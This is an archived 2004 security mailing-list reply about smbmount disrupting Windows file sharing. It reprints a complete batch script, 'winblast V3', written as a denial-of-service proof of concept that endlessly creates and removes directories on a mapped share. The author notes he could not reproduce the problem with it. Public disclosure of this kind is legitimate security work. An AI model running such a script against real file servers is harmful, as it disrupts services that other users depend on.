
Date: Wed, 04 Feb 2004 09:45:09 +0100
From: "Daniel Kabs [ML]" <dkabs@...otix.com>
To: rslade@...int.ca
Cc: steve.wray@...adise.net.nz, full-disclosure@...ts.netsys.com,
   bugtraq@...urityfocus.com
Subject: Re: smbmount disrupts Windows file sharing.


On Tue, 3 Feb 2004 12:09:58 ,<rslade@...int.ca> wrote:
> OK, obvious question.  Can you do the same thing with md, rd,
> and a BAT file, or 
> is a specific smbmount quirk necessary?

I've posted the Windows Batch File to Full-Disclosure on 
Tue, 03 Feb 2004 11:45:25 +0100.

Here's the _corrected_ batch file again:
-------------cut here--------------------------
@echo off
REM winblast V3 - DoS on WinXP, Win2003Srv
REM 2003-12-04 Steve Ladjabi, Daniel Kabs

K:
if ERRORLEVEL 1 goto exit0

cd \sharedfolder
if ERRORLEVEL 1 goto exit0

set count=0

REM using 'pathcount' directories
set pathcount=1000

echo running 'winblast v3' with %pathcount% files in loop ...
:START
  set /a p=pathcount*2-1
  set /a stop=pathcount-1
  :LOOP
    set dirname="wbst%p%"
    REM delete old directory if it exists
    if exist %dirname% rmdir %dirname%
    REM generating directory and exit on any error
    mkdir %dirname%
    if ERRORLEVEL 1 goto exit1
    set /a p=p-1
    set /a count=count+1
    if not "%p%" == "%stop%" goto LOOP
  echo %count% directories generated ...
goto START

:exit0
echo Abort. Could not open target directory.
goto ende

:exit1
echo Abort. Could not create directory: %dirname%

:ende
-------------cut here--------------------------

To make a long story short: I could not replicate that
problem using this script on a Windows client.

Cheers
Daniel

_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.netsys.com/full-disclosure-charter.html


